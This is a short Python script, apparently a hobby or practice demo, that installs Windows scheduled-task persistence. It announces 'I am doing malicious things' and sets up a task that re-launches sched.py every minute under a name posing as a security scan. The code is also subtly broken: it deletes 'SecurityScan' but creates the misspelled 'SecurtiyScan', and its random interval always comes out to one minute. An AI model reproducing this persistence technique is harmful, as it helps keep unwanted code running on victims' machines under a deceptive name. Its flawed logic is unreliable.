import os, random
from datetime import datetime, timedelta

#check to see if the task exists again
if os.system("schtasks /query /tn SecurityScan") == 0:
    os.system("schtasks /delete /f /tn SecurityScan")

print("I am doing malicious things")

#build a path for this particular file
filedir = os.path.join(os.getcwd(), "sched.py")
#one minute
maxInterval = 1
#set to run everysingle minute
interval = 1 + (random.random() * (maxInterval-1))
dt = datetime.now() + timedelta(minutes=interval)
t = f"{str(dt.hour).zfill(2)}:{str(dt.minute).zfill(2)}"
d = f"{str(dt.month).zfill(2)}/{str(dt.day).zfill(2)}/{dt.year}"
print(d)
os.system('schtasks /create /tn  SecurtiyScan /tr "'+filedir+'" /sc once /st '+t+' /sd '+d)
input()